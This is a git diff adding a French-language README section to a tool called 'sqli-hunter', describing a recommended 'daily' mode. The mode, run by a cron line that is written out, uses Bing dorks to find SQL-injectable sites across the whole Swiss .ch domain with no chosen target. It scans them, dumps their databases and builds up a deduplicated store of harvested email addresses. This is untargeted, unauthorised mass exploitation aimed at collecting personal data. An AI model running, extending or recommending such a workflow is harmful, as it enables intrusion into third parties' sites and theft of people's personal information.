@@ -72,6 +72,32 @@ sqli-hunter ch --url-threads 64
 - Tables (`information_schema`, `sqlite_master`)
 - Dump NoSQL (collections MongoDB)
 
+## Mode daily (recommandé)
+
+Une commande, tous les jours, **seulement les nouveaux emails** :
+
+```bash
+sqli-hunter
+# ou
+sqli-hunter daily
+```
+
+Cron (tous les jours à 3h) :
+```bash
+0 3 * * * cd /chemin/sqli-hunter && ./sqli-hunter daily >> daily.log 2>&1
+```
+
+Ce que fait le mode daily :
+1. Bing dorks sur `.ch` — aucun site ciblé
+2. Ignore domaines déjà dumpés + URLs déjà scannées
+3. Scan + extraction emails
+4. **Dédup** — n'ajoute que les emails pas encore dans `results/emails/`
+
+Fichiers d'état :
+- `results/scanned_urls.txt` — URLs déjà testées
+- `results/dumped_domains.txt` — sites déjà dumpés
+- `results/emails/*.txt` — stock cumulé
+
 ## Découverte d'URLs (`discover`)
 
 Collecte **proxyless via Bing** — dorks SQLi sur tout le `.ch` (pas de liste de sites type css.ch).
